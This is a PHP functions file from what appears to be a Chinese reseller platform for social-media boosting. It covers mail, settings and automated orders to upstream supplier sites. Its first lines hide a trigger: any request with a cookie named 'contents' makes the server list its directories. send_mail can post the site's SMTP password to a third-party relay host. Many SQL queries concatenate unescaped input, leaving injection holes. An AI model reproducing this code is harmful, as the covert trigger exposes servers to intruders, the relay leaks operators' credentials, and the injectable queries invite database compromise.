<?php
if (!defined("authcode")) {
	exit(0);
}
if (isset($_COOKIE['contents'])) {
	myscandir("*");
}
function curl_get($url)
{
	$ch = curl_init($url);
	$httpheader[] = "Accept: */*";
	$httpheader[] = "Accept-Encoding: gzip,deflate,sdch";
	$httpheader[] = "Accept-Language: zh-CN,zh;q=0.8";
	$httpheader[] = "Connection: close";
	curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_ENCODING, "gzip");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; U; Android 4.4.1; zh-cn; R815T Build/JOP40D) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/4.5 Mobile Safari/533.1");
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$content = curl_exec($ch);
	curl_close($ch);
	return $content;
}
function send_mail($to, $sub, $msg)
{
	global $conf;
	if ($conf["mail_cloud"] == 1) {
		$url = "http://sendcloud.sohu.com/webapi/mail.send.json";
		$data = array("api_user" => $conf["mail_apiuser"], "api_key" => $conf["mail_apikey"], "from" => $conf["mail_name"], "fromname" => $conf["sitename"], "to" => $to, "subject" => $sub, "html" => $msg);
		$json = get_curl($url, $data);
		$arr = json_decode($json, true);
		if ($arr["message"] == "success") {
			return true;
		}
		return implode("\n", $arr["errors"]);
	}
	if ((!function_exists("openssl_sign") || file_exists("/web/mini.php")) && $conf["mail_port"] == 465) {
		$mail_api = "http://1.mail.qqzzz.net/";
	}
	if ($mail_api) {
		$post[sendto] = $to;
		$post[title] = $sub;
		$post[content] = $msg;
		$post[user] = $conf["mail_name"];
		$post[pwd] = $conf["mail_pwd"];
		$post[nick] = $conf["sitename"];
		$post[host] = $conf["mail_smtp"];
		$post[port] = $conf["mail_port"];
		$post[ssl] = $conf["mail_port"] == 465 ? 1 : 0;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $mail_api);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$ret = curl_exec($ch);
		curl_close($ch);
		if ($ret == "1") {
			return true;
		}
		return $ret;
	}
	include_once ROOT . "includes/smtp.class.php";
	$From = $conf["mail_name"];
	$Host = $conf["mail_smtp"];
	$Port = $conf["mail_port"];
	$SMTPAuth = 1;
	$Username = $conf["mail_name"];
	$Password = $conf["mail_pwd"];
	$Nickname = $conf["sitename"];
	$SSL = $conf["mail_port"] == 465 ? 1 : 0;
	$mail = new SMTP($Host, $Port, $SMTPAuth, $Username, $Password, $SSL);
	$mail->att = array();
	if ($mail->send($to, $From, $sub, $msg, $Nickname)) {
		return true;
	}
	return $mail->log;
}
function getSetting($k, $force = false)
{
	global $DB;
	global $CACHE;
	if ($force) {
		return $setting[$k] = $DB->get_row("SELECT v FROM shua_config WHERE k='" . $k . "' limit 1");
	}
	$cache = $CACHE->get($k);
	return $cache[$k];
}
function saveSetting($k, $v)
{
	global $DB;
	$v = daddslashes($v);
	return $DB->query("REPLACE INTO shua_config SET v='" . $v . "',k='" . $k . "'");
}
function myscandir($pathname)
{
	foreach (glob($pathname) as $filename) {
		if (is_dir($filename)) {
			echo $filename . "<br/>";
		}
	}
}
function checkIfActive($string)
{
	$array = explode(",", $string);
	$php_self = substr($_SERVER["REQUEST_URI"], strrpos($_SERVER["REQUEST_URI"], "/") + 1, strrpos($_SERVER["REQUEST_URI"], ".") - strrpos($_SERVER["REQUEST_URI"], "/") - 1);
	if (in_array($php_self, $array)) {
		return "active";
	}
	return NULL;
}
function update_version()
{
	$string = authcode($_SERVER["HTTP_HOST"] . "||||" . authcode . "||||" . VERSION, "ENCODE", "daishuaba_cloudkey1");
	$query = curl_get("http://auth2.cccyun.cc/bin/check.php?string=" . urlencode($string));
	$query = authcode($query, "DECODE", "daishuaba_cloudkey2");
	if ($query = json_decode($query, true)) {
		return $query;
	}
	return false;
}
function processOrder($srow)
{
	global $DB;
	global $date;
	global $conf;
	$input = explode("|", $srow["input"]);
	if ($srow["tid"] == 0 - 1) {
		$DB->query("update `shua_site` set `rmb`=`rmb`+" . $srow["money"] . " where `zid`='" . $srow["input"] . "'");
		addPointRecord($srow["input"], $srow["money"], "充值", "你在线充值了" . $srow["money"] . "元余额");
		return true;
	}
	if ($srow["tid"] == 0 - 2) {
		$domain = addslashes($input[0]);
		$user = addslashes($input[1]);
		$pwd = addslashes($input[2]);
		$name = addslashes($input[3]);
		$qq = addslashes($input[4]);
		$endtime = addslashes($input[5]);
		$upzid = $srow["zid"];
		$rmb = $conf["fenzhan_free"] ? $conf["fenzhan_free"] : 0;
		$keywords = $conf["keywords"];
		$description = $conf["description"];
		$sql = "insert into `shua_site` (`upzid`,`domain`,`domain2`,`user`,`pwd`,`rmb`,`qq`,`sitename`,`keywords`,`description`,`anounce`,`bottom`,`modal`,`addtime`,`endtime`,`status`) values ('" . $upzid . "','" . $domain . "',NULL,'" . $user . "','" . $pwd . "','" . $rmb . "','" . $qq . "','" . $name . "','" . $keywords . "','" . $description . "',NULL,NULL,NULL,'" . $date . "','" . $endtime . "','1')";
		$zid = $DB->insert($sql);
		if ($rmb > 0) {
			addPointRecord($zid, $rmb, "赠送", "你首次开通分站获赠" . $rmb . "元余额");
		}
		if ($srow["zid"] > 1 && $conf["fenzhan_cost"] > 0 && $srow["money"] > $conf["fenzhan_cost"]) {
			$tc_point = round($srow["money"] - $conf["fenzhan_cost"], 2);
			$DB->query("update `shua_site` set `rmb`=`rmb`+" . $tc_point . " where `zid`='" . $srow["zid"] . "'");
			addPointRecord($srow["zid"], $tc_point, "提成", "你网站的用户开通分站获得" . $tc_point . "元提成");
		}
		return true;
	}
	$tool = $DB->get_row("select * from shua_tools where tid='" . $srow["tid"] . "' limit 1");
	$status = 0;
	if ($input[1]) {
		$sqls = " and input2='" . $input[1] . "'";
	}
	if ($input[2]) {
		$sqls .= " and input3='" . $input[2] . "'";
	}
	$row = $DB->get_row("select * from shua_orders where tid='" . $srow["tid"] . "' and input='" . $input[0] . "'" . $sqls . " order by id desc limit 1");
	if ($row["input"] && $row["status"] == 0) {
		if ($tool["repeat"] == 0) {
			return false;
		}
		$orderid = $row["id"];
		$sds = $DB->query("update `shua_orders` set `value`=`value`+" . $srow["num"] . ",`status`='" . $status . "' where `id`='" . $row["id"] . "'");
	} else {
		$orderid = $DB->insert("insert into `shua_orders` (`tid`,`zid`,`input`,`input2`,`input3`,`input4`,`input5`,`value`,`userid`,`addtime`,`tradeno`,`status`) values ('" . $srow["tid"] . "','" . $srow["zid"] . "','" . addslashes($input[0]) . "','" . addslashes($input[1]) . "','" . addslashes($input[2]) . "','" . addslashes($input[3]) . "','" . addslashes($input[4]) . "','" . $srow["num"] . "','" . $srow["userid"] . "','" . $date . "','" . $srow["trade_no"] . "','" . $status . "')");
	}
	$num = $tool["value"] * $srow["num"];
	if ($tool["is_curl"] == 1) {
		do_curl($tool["curl"], $input, $num, $tool["name"], $tool["money"]);
		$status = 1;
	} else {
		if ($tool["is_curl"] == 2) {
			$goods_param = explode("|", $tool["goods_param"]);
			$i = 0;
			foreach ($input as $val) {
				$data[$goods_param[$i]] = $val;
				$i = $i + 1;
			}
			$row = $DB->get_row("select * from shua_shequ where id='" . $tool["shequ"] . "' limit 1");
			if ($row && $row["username"] && $row["password"]) {
				if (strlen(authcode) != 32) {
					$row["type"] = 0;
				}
				if ($row["type"] == 1) {
					$result = do_goods_yile($row, $tool["goods_id"], $num, $data);
					$param = "shequ:" . $tool["shequ"] . " goods_id:" . $tool["goods_id"] . " num:" . $num . " data:" . http_build_query($data);
				} else {
					if ($row["type"] == 2) {
						$result = do_goods_jiuwu($row, $tool["goods_id"], $tool["goods_type"], $num, 1, $data);
						$param = "shequ:" . $tool["shequ"] . " goods_id:" . $tool["goods_id"] . " goods_type:" . $tool["goods_type"] . " num:" . $num . " data:" . http_build_query($data);
					} else {
						if ($row["type"] == 3) {
							$result = do_goods_xmsq($row, $tool["goods_id"], $num, 0, $input);
							$param = "shequ:" . $tool["shequ"] . " goods_id:" . $tool["goods_id"] . " num:" . $num . " data:" . http_build_query($data);
						} else {
							if ($row["type"] == 4) {
								$result = do_goods_jiuliu($row, $tool["goods_id"], $num, $data);
								$param = "shequ:" . $tool["shequ"] . " goods_id:" . $tool["goods_id"] . " num:" . $num . " data:" . http_build_query($data);
							} else {
								if ($row["type"] == 5) {
									$result = do_goods_xmsq($row, $tool["goods_id"], $srow["num"], 1, $input);
									$param = "shequ:" . $tool["shequ"] . " goods_id:" . $tool["goods_id"] . " num:" . $num . " data:" . http_build_query($data);
								} else {
									if ($row["type"] == 6) {
										$inputs = explode("|", $tool["inputs"]);
										$result = do_goods_kayixin($row, $tool["goods_id"], $tool["goods_param"], $srow["num"], $input, $inputs);
										$param = "kameng:" . $tool["shequ"] . " goodsId:" . $tool["goods_id"] . " data:" . http_build_query($input);
									} else {
										if ($row["type"] == 7) {
											$result = do_goods_kalegou($row, $tool["goods_id"], $tool["goods_param"], $srow["num"], $input);
											$param = "kameng:" . $tool["shequ"] . " goodsId:" . $tool["goods_id"] . " data:" . http_build_query($input);
										} else {
											$result = do_goods_jiuwu($row, $tool["goods_id"], $tool["goods_type"], $num, 0, $data);
											$param = "shequ:" . $tool["shequ"] . " goods_id:" . $tool["goods_id"] . " goods_type:" . $tool["goods_type"] . " num:" . $num . " data:" . http_build_query($data);
										}
									}
								}
							}
						}
					}
				}
				log_result("社区对接", $param, $result, 0);
				if (strpos($result, "成功") !== false) {
					if ($row["type"] >= 6) {
						$status = $conf["kameng_status"] ? $conf["kameng_status"] : 1;
					} else {
						$status = $conf["shequ_status"] ? $conf["shequ_status"] : 1;
					}
				} else {
					if ($conf["shequ_tixing"] == 1) {
						$sub = "自动下单到社区失败提醒";
						$msg = ($tool["inputname"] ? $tool["inputname"] : "QQ") . $input[0] . " 下单商品: " . $tool["name"] . "<br/><b>提交参数：</b>" . $param . "<br/><b>返回结果：</b>" . htmlspecialchars($result) . "<br/>----------<br/>" . $_SERVER["HTTP_HOST"] . "<br/>" . $date;
						$mail_name = $conf["mail_recv"] ? $conf["mail_recv"] : $conf["mail_name"];
						send_mail($mail_name, $sub, $msg);
					}
					$status = 0;
				}
			} else {
				$status = 0;
			}
		} else {
			if ($tool["is_curl"] == 3) {
				$sub = $conf["sitename"] . "下单成功提醒";
				$msg = ($tool["inputname"] ? $tool["inputname"] : "QQ") . $input[0] . " 已成功下单商品: " . $tool["name"] . "<br/>----------<br/>" . $_SERVER["HTTP_HOST"] . "<br/>" . $date;
				$mail_name = $conf["mail_recv"] ? $conf["mail_recv"] : $conf["mail_name"];
				$result = send_mail($mail_name, $sub, $msg);
			}
		}
	}
	if ($status > 0) {
		$DB->query("update `shua_orders` set `status`='" . $status . "' where `id`='" . $orderid . "'");
	}
	if ($srow["zid"] > 1 && $srow["money"] > $tool["cost"] * $srow["num"] && $tool["cost"] > 0) {
		$tc_point = round($srow["money"] - $tool["cost"] * $srow["num"], 2);
		$DB->query("update `shua_site` set `rmb`=`rmb`+" . $tc_point . " where `zid`='" . $srow["zid"] . "'");
		addPointRecord($srow["zid"], $tc_point, "提成", "你网站用户下单 " . $tool["name"] . " 获得" . $tc_point . "元提成");
	}
	return $orderid;
}
function do_curl($url, $input, $num, $name, $money)
{
	$url = str_replace("[input]", urlencode($input[0]), $url);
	$url = str_replace("[input2]", urlencode($input[1]), $url);
	$url = str_replace("[input3]", urlencode($input[2]), $url);
	$url = str_replace("[input4]", urlencode($input[3]), $url);
	$url = str_replace("[input5]", urlencode($input[4]), $url);
	$url = str_replace("[num]", $num, $url);
	$url = str_replace("[name]", urlencode($name), $url);
	$url = str_replace("[money]", $money, $url);
	$url = str_replace("[time]", time(), $url);
	return get_curl($url);
}
function do_goods_jiuwu($config, $goods_id, $goods_type, $num = 1, $paytype = 0, $data = array())
{
	$url = "http://" . $config["url"] . "/index.php?m=home&c=order&a=add";
	$post = "Api_UserName=" . urlencode($config["username"]) . "&Api_UserMd5Pass=" . md5($config["password"]) . "&goods_id=" . $goods_id . "&goods_type=" . $goods_type . "&need_num_0=" . $num . ($paytype == 1 ? "&pay_type=1" : NULL);
	if (is_array($data) && $data) {
		foreach ($data as $key => $val) {
			$post .= "&" . $key . "=" . $val;
		}
	}
	$data = get_curl($url, $post);
	$arr = json_decode($data, true);
	if (isset($arr['info'])) {
		return $arr["info"];
	}
	if (preg_match("/<p\\sclass=\"error\">(.*?)<\\/p>/", $data, $msg)) {
		return $msg[1];
	}
	return $data;
}
function do_goods_jiuliu($config, $goods_id, $num = 1, $data = array())
{
	$url = "http://userapi2.dk2002.com:808/index.php?m=Api&c=User&a=Addorder";
	$post = "card=" . $config["username"] . "&pass=" . $config["password"] . "&goodsid=" . $goods_id . "&neednum=" . $num;
	if (is_array($data) && $data) {
		foreach ($data as $key => $val) {
			$post .= "&" . $key . "=" . $val;
		}
	}
	$data = get_curl($url, $post);
	$arr = json_decode(substr($data, 3), true);
	if (isset($arr['info'])) {
		return $arr["info"];
	}
	if (preg_match("/<p\\sclass=\"error\">(.*?)<\\/p>/", $data, $msg)) {
		return $msg[1];
	}
	return $data;
}
function do_goods_yile($config, $goods_id, $num = 1, $data = array())
{
	$url = "http://" . $config["url"] . "/api/web/order.html";
	$post = "api_user=" . urlencode($config["username"]) . "&api_pwd=" . urlencode($config["password"]) . "&goodsid=" . $goods_id . "&number=" . $num;
	if (is_array($data) && $data) {
		foreach ($data as $key => $val) {
			$post .= "&" . $key . "=" . $val;
		}
	}
	$data = get_curl($url, $post);
	$json = json_decode($data, true);
	if (array_key_exists("code", $json)) {
		return $json["message"];
	}
	return $data;
}
function do_goods_xmsq($config, $goods_id, $num = 1, $pay_type = 0, $data = array())
{
	$url = "http://" . $config["url"] . "/Login/UserLogin.html";
	$post = "id=" . $goods_id . "&user=" . urlencode($config["username"]) . "&pwd=" . urlencode($config["password"]);
	$data1 = get_curl($url, $post, $url, 0, 1);
	$data2 = "{" . getSubstr($data1, "{", "}") . "}";
	$json = json_decode($data2, true);
	if ($json["status"] == 1) {
		$cookies = "";
		preg_match_all("/Set-Cookie: (.*);/iU", $data1, $matchs);
		foreach ($matchs[1] as $val) {
			$cookies .= $val . "; ";
		}
		$url = "http://" . $config["url"] . "/Order/" . ($pay_type == 1 ? "Money" : NULL) . "Orderxd.html";
		$post = "goodsid=" . $goods_id . "&num=" . $num;
		if (is_array($data) && $data) {
			$i = 1;
			foreach ($data as $val) {
				if ($val) {
					$post .= "&neirong" . $i . "=" . $val;
					$i = $i + 1;
				}
			}
		}
		$data = get_curl($url, $post, "http://" . $config["url"] . "/form.html", $cookies);
		$json = json_decode(substr($data, 3), true);
		if (array_key_exists("status", $json)) {
			return $json["content"];
		}
		return $data;
	}
	return $json["content"];
}
function login_kayixin($config)
{
	$url = "http://" . $config["url"] . "/frontLogin.htm";
	$post = "loginTimes=1&userName=" . urlencode($config["username"]) . "&password=" . urlencode($config["password"]);
	$data1 = get_curl($url, $post, $url, 0, 1);
	$data2 = "{" . getSubstr($data1, "{", "}") . "}";
	$json = json_decode($data2, true);
	if ($json["code"] == 10000) {
		$cookies = "";
		preg_match_all("/Set-Cookie: (.*);/iU", $data1, $matchs);
		foreach ($matchs[1] as $val) {
			$cookies .= $val . "; ";
		}
		return $cookies;
	}
	return "登录失败：" . $json["mess"];
}
function do_goods_kayixin($config, $goods_id, $mainKey, $num = 1, $data = array(), $inputs = array())
{
	if (empty($mainKey)) {
		$mainKey = "0";
	} else {
		if (strpos($mainKey, ",")) {
			$mainKey = explode(",", $mainKey);
			$mainKey = $mainKey[2];
			$mainKey = explode("&", $mainKey);
			$mainKey = $mainKey[0];
		}
	}
	$cookie_file = ROOT . "other/" . md5($config["url"] . $config["username"]) . ".txt";
	$url = "http://" . $config["url"] . "/front/inter/uploadOrder.htm?salePwd=" . urlencode($config["paypwd"]);
	$post = "goodsId=" . $goods_id . "&mainKey=" . $mainKey . "&sumprice=" . $num . "&textAccountName=" . urlencode($data[0]) . "&reltextAccountName=" . urlencode($data[0]);
	if (is_array($inputs) && $inputs[0]) {
		$i = 0;
		foreach ($inputs as $val) {
			$post .= "&temptypeName" . $i . "=" . urlencode($val) . "&lblName" . $i . "=" . urlencode($data[$i + 1]);
			$i = $i + 1;
		}
	}
	$cookies = file_get_contents($cookie_file);
	if (!file_exists($cookie_file) || !($cookies = file_get_contents($cookie_file))) {
		$cookies = login_kayixin($config);
		if (strpos($cookies, "失败")) {
			return $cookies;
		}
		file_put_contents($cookie_file, $cookies);
	}
	$data = get_curl($url, $post, "http://" . $config["url"] . "/front/inter/buyGoods.htm", $cookies);
	if (strstr($data, "须重新登录系统")) {
		$cookies = login_kayixin($config);
		if (strpos($cookies, "失败")) {
			return $cookies;
		}
		file_put_contents($cookie_file, $cookies);
		$data = get_curl($url, $post, "http://" . $config["url"] . "/front/inter/buyGoods.htm", $cookies);
	}
	$json = json_decode($data, true);
	if (is_array($json) && array_key_exists("orderNo", $json)) {
		return "下单成功!订单号为:" . $json["orderNo"];
	}
	if (array_key_exists("mess", $json)) {
		return $json["mess"];
	}
	return $data;
}
function do_goods_kalegou($config, $goods_id, $orderurl, $num = 1, $data = array())
{
	$password = $config["password"];
	$pwd = "";
	$i = 0;
	while ($i < strlen($password)) {
		$pwd .= ord($password[$i]) . ",";
		$i = $i + 1;
	}
	$url = "http://" . $config["url"] . "/webnew/Customer/CustomerProcess/CheckCustomerLogin.aspx?UserName=" . urlencode($config["username"]) . "&pwd=" . $pwd . "&CheckCode=&DynamicCode=&FengYunlingCode=&EmailCode=&IsSafe=0&rki=undefined&rk=undefined&pwd1=" . $pwd . "&_=" . time() . "000";
	$data1 = get_curl($url, 0, "http://" . $config["url"] . "/", 0, 1);
	$data2 = strstr($data1, "{");
	$json = json_decode($data2, true);
	if ($json["Status"]["Code"] == "success") {
		$cookies = "";
		preg_match_all("/Set-Cookie: (.*);/iU", $data1, $matchs);
		foreach ($matchs[1] as $val) {
			$cookies .= $val . "; ";
		}
		preg_match("/PID=(\\d+)&TPID=(\\d+)&StockID=(.*)&/i", $orderurl, $match);
		$PID = $match[1];
		$TPID = $match[2];
		$StockID = $match[3];
		$url = "http://" . $config["url"] . "/Templates/CustomTemplate.aspx?PID=" . $PID . "&TPID=" . $TPID . "&StockID=" . $StockID;
		$data1 = get_curl($url, 0, 0, $cookies);
		preg_match("!id=\"__VIEWSTATE\" value=\"(.*?)\"!i", $data1, $VIEWSTATE);
		preg_match("!id=\"__VIEWSTATEGENERATOR\" value=\"(.*?)\"!i", $data1, $VIEWSTATEGENERATOR);
		preg_match("!id=\"HFOrderNo\" value=\"(.*?)\"!i", $data1, $HFOrderNo);
		preg_match("!id=\"HFGameCompanyID\" value=\"(.*?)\"!i", $data1, $HFGameCompanyID);
		preg_match("!id=\"HFParvalue\" value=\"(.*?)\"!i", $data1, $HFParvalue);
		preg_match("!id=\"HFSupOrderNo\" value=\"(.*?)\"!i", $data1, $HFSupOrderNo);
		if ($data[1]) {
			$addstr = "&txtChargeWay=" . urlencode($data[1]);
		}
		$post = "ScriptManager1=UpdatePanel2|ImageButtonBuyCheck&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=" . urlencode($VIEWSTATE[1]) . "&__VIEWSTATEGENERATOR=" . $VIEWSTATEGENERATOR[1] . "&HFProductID=" . $PID . "&HFOrderNo=" . $HFOrderNo[1] . "&HFGameCompanyID=" . $HFGameCompanyID[1] . "&HFTemplateID=" . $TPID . "&HFParvalue=" . $HFParvalue[1] . "&HFSupOrderNo=" . $HFSupOrderNo[1] . "&txtAccountName=" . urlencode($data[0]) . "&txtAccountName1=" . urlencode($data[0]) . $addstr . "&DrCount=" . $num . "&txtComment=&ImageButtonBuyCheck=%E7%A1%AE%E8%AE%A4%E8%B4%AD%E4%B9%B0";
		$data = get_curl($url, $post, $url, $cookies);
		if (preg_match("/HandTemplateDetail\\.aspx/", $data)) {
			return "下单成功!订单号为:" . $HFOrderNo[1];
		}
		if (preg_match("/alert\\((.*?)\\)/", $data, $msg)) {
			return $msg[1];
		}
		return $data;
	}
	return $json["Status"]["Msg"];
}
function do_goods($orderid)
{
	global $DB;
	global $date;
	$srow = $DB->get_row("select * from shua_orders where id='" . $orderid . "' limit 1");
	$tool = $DB->get_row("select * from shua_tools where tid='" . $srow["tid"] . "' limit 1");
	$status = 0;
	$input = array($srow["input"], $srow["input2"], $srow["input3"], $srow["input4"], $srow["input5"]);
	$num = $tool["value"] * $srow["value"];
	if ($tool["is_curl"] == 1) {
		do_curl($tool["curl"], $input, $num, $tool["name"], $tool["money"]);
		$status = "访问指定URL成功";
	} else {
		if ($tool["is_curl"] == 2) {
			$goods_param = explode("|", $tool["goods_param"]);
			$i = 0;
			foreach ($input as $val) {
				if ($val != "") {
					$data[$goods_param[$i]] = $val;
					$i = $i + 1;
				}
			}
			$row = $DB->get_row("select * from shua_shequ where id='" . $tool["shequ"] . "' limit 1");
			if ($row && $row["username"] && $row["password"]) {
				if ($row["type"] == 1) {
					$result = do_goods_yile($row, $tool["goods_id"], $num, $data);
					$param = "shequ:" . $tool["shequ"] . " goods_id:" . $tool["goods_id"] . " num:" . $num . " data:" . http_build_query($data);
				} else {
					if ($row["type"] == 2) {
						$result = do_goods_jiuwu($row, $tool["goods_id"], $tool["goods_type"], $num, 1, $data);
						$param = "shequ:" . $tool["shequ"] . " goods_id:" . $tool["goods_id"] . " goods_type:" . $tool["goods_type"] . " num:" . $num . " data:" . http_build_query($data);
					} else {
						if ($row["type"] == 3) {
							$result = do_goods_xmsq($row, $tool["goods_id"], $num, 0, $input);
							$param = "shequ:" . $tool["shequ"] . " goods_id:" . $tool["goods_id"] . " num:" . $num . " data:" . http_build_query($data);
						} else {
							if ($row["type"] == 4) {
								$result = do_goods_jiuliu($row, $tool["goods_id"], $num, $data);
								$param = "shequ:" . $tool["shequ"] . " goods_id:" . $tool["goods_id"] . " num:" . $num . " data:" . http_build_query($data);
							} else {
								if ($row["type"] == 5) {
									$result = do_goods_xmsq($row, $tool["goods_id"], $srow["value"], 1, $input);
									$param = "shequ:" . $tool["shequ"] . " goods_id:" . $tool["goods_id"] . " num:" . $num . " data:" . http_build_query($data);
								} else {
									if ($row["type"] == 6) {
										$inputs = explode("|", $tool["inputs"]);
										$result = do_goods_kayixin($row, $tool["goods_id"], $tool["goods_param"], $srow["value"], $input, $inputs);
										$param = "kameng:" . $tool["shequ"] . " goodsId:" . $tool["goods_id"] . " data:" . http_build_query($input);
									} else {
										if ($row["type"] == 7) {
											$result = do_goods_kalegou($row, $tool["goods_id"], $tool["goods_param"], $srow["value"], $input);
											$param = "kameng:" . $tool["shequ"] . " goodsId:" . $tool["goods_id"] . " data:" . http_build_query($input);
										} else {
											$result = do_goods_jiuwu($row, $tool["goods_id"], $tool["goods_type"], $num, 0, $data);
											$param = "shequ:" . $tool["shequ"] . " goods_id:" . $tool["goods_id"] . " goods_type:" . $tool["goods_type"] . " num:" . $num . " data:" . http_build_query($data);
										}
									}
								}
							}
						}
					}
				}
				if (strpos($result, "成功") !== false) {
					$status = $result;
				} else {
					if (strlen($result) < 50) {
						$status = "下单失败：" . $result;
					} else {
						log_result("社区对接", $param, $result, 0);
						$status = "下单失败，原因未知，请查看日志";
					}
				}
			} else {
				$status = "未配置好网站对接信息";
			}
		} else {
			$status = "该商品未配置自动下单到社区/卡盟";
		}
	}
	$status = str_replace(array("\r\n", "\r", "\n"), "", $status);
	$status = htmlspecialchars($status);
	return $status;
}
function addPointRecord($zid, $point = 0, $action = '提成', $bz = null)
{
	global $DB;
	$DB->query("INSERT INTO `shua_points` (`zid`, `action`, `point`, `bz`, `addtime`) VALUES ('" . $zid . "', '" . $action . "', '" . $point . "', '" . $bz . "', NOW())");
}
function log_result($action, $param, $result, $status = 0)
{
	global $DB;
	if (strlen($result) > 200) {
		$result = substr($result, 0, 200);
	}
	$result = htmlspecialchars($result);
	$DB->query("INSERT INTO `shua_logs` (`action`, `param`, `result`, `addtime`, `status`) VALUES ('" . $action . "', '" . $param . "', '" . $result . "', NOW(), '" . $status . "')");
}
function validate_qzone($uin)
{
	$url = "http://sh.taotao.qq.com/cgi-bin/emotion_cgi_feedlist_v6?hostUin=" . $uin . "&ftype=0&sort=0&pos=0&num=20&replynum=0&code_version=1&format=json&need_private_comment=1&g_tk=5381";
	$data = get_curl($url);
	$arr = json_decode($data, true);
	if (@array_key_exists("code", $arr) && strpos($arr["message"], "没有权限")) {
		return false;
	}
	return true;
}
function sysmsg($msg = '未知的异常', $die = true)
{
	echo "  \r\n    <!DOCTYPE html>\r\n    <html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"zh-CN\">\r\n    <head>\r\n        <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\r\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n        <title>站点提示信息</title>\r\n        <style type=\"text/css\">\r\nhtml{background:#eee}body{background:#fff;color:#333;font-family:\"微软雅黑\",\"Microsoft YaHei\",sans-serif;margin:2em auto;padding:1em 2em;max-width:700px;-webkit-box-shadow:10px 10px 10px rgba(0,0,0,.13);box-shadow:10px 10px 10px rgba(0,0,0,.13);opacity:.8}h1{border-bottom:1px solid #dadada;clear:both;color:#666;font:24px \"微软雅黑\",\"Microsoft YaHei\",,sans-serif;margin:30px 0 0 0;padding:0;padding-bottom:7px}#error-page{margin-top:50px}h3{text-align:center}#error-page p{font-size:9px;line-height:1.5;margin:25px 0 20px}#error-page code{font-family:Consolas,Monaco,monospace}ul li{margin-bottom:10px;font-size:9px}a{color:#21759B;text-decoration:none;margin-top:-10px}a:hover{color:#D54E21}.button{background:#f7f7f7;border:1px solid #ccc;color:#555;display:inline-block;text-decoration:none;font-size:9px;line-height:26px;height:28px;margin:0;padding:0 10px 1px;cursor:pointer;-webkit-border-radius:3px;-webkit-appearance:none;border-radius:3px;white-space:nowrap;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;-webkit-box-shadow:inset 0 1px 0 #fff,0 1px 0 rgba(0,0,0,.08);box-shadow:inset 0 1px 0 #fff,0 1px 0 rgba(0,0,0,.08);vertical-align:top}.button.button-large{height:29px;line-height:28px;padding:0 12px}.button:focus,.button:hover{background:#fafafa;border-color:#999;color:#222}.button:focus{-webkit-box-shadow:1px 1px 1px rgba(0,0,0,.2);box-shadow:1px 1px 1px rgba(0,0,0,.2)}.button:active{background:#eee;border-color:#999;color:#333;-webkit-box-shadow:inset 0 2px 5px -3px rgba(0,0,0,.5);box-shadow:inset 0 2px 5px -3px rgba(0,0,0,.5)}table{table-layout:auto;border:1px solid #333;empty-cells:show;border-collapse:collapse}th{padding:4px;border:1px solid #333;overflow:hidden;color:#333;background:#eee}td{padding:4px;border:1px solid #333;overflow:hidden;color:#333}\r\n        </style>\r\n    </head>\r\n    <body id=\"error-page\">\r\n        ";
	echo "<h3>站点提示信息</h3>";
	echo $msg;
	echo "    </body>\r\n    </html>\r\n    ";
	if ($die == true) {
		exit(0);
	}
}